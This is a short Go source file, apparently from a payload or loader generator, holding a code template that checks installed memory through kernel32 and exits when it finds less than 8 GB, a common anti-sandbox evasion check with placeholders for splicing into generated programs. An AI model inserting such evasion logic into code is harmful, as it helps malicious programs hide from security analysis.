package sandbox

var (
	Ramcheck = []string{
		`	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem < 8 {
		os.Exit(0)
	}
    fmt.Println("good job")
	//__SANDBOX__
`, `
	"os"
    "fmt"
	"syscall"
	//__IMPORT__
`}
)
